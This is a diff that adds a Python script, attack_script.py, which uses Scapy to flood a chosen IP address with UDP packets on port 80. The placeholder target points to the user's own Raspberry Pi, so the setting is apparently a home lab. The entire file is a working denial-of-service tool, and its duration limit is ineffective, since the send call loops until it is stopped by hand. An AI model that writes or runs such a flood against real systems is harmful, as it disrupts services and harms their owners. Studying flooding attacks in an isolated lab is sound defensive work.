@@ -1,0 +1,39 @@
+# attack_script.py
+
+from scapy.all import send, IP, UDP, RandShort
+import time
+
+# --- Configuration ---
+VICTIM_IP = "YOUR_RASPBERRY_PI_IP"  # <<< IMPORTANT: Change this!
+TARGET_PORT = 80
+ATTACK_DURATION_SECONDS = 30 # Run the attack for 30 seconds
+
+def udp_flood(target_ip, target_port, duration):
+    """Sends a flood of UDP packets to a target."""
+    print(f"Starting UDP flood against {target_ip}:{target_port} for {duration} seconds...")
+    
+    # Create a malicious UDP packet
+    packet = IP(dst=target_ip) / UDP(sport=RandShort(), dport=target_port)
+    
+    end_time = time.time() + duration
+    packet_count = 0
+    
+    try:
+        # The send function in Scapy has a built-in loop option
+        # 'loop=1' will send continuously, 'verbose=0' keeps the console clean
+        send(packet, loop=1, verbose=0)
+        
+        # This is a simple way to control duration; a more robust script would use threads.
+        # For this simple script, you will need to stop it manually with Ctrl+C.
+        print("Attack running. Press Ctrl+C to stop.")
+        while time.time() < end_time:
+            time.sleep(1)
+
+    except KeyboardInterrupt:
+        print("\nAttack stopped.")
+
+if __name__ == "__main__":
+    if VICTIM_IP == "YOUR_RASPBERRY_PI_IP":
+        print("ERROR: Please change the VICTIM_IP variable in the script.")
+    else:
+        udp_flood(VICTIM_IP, TARGET_PORT, ATTACK_DURATION_SECONDS)
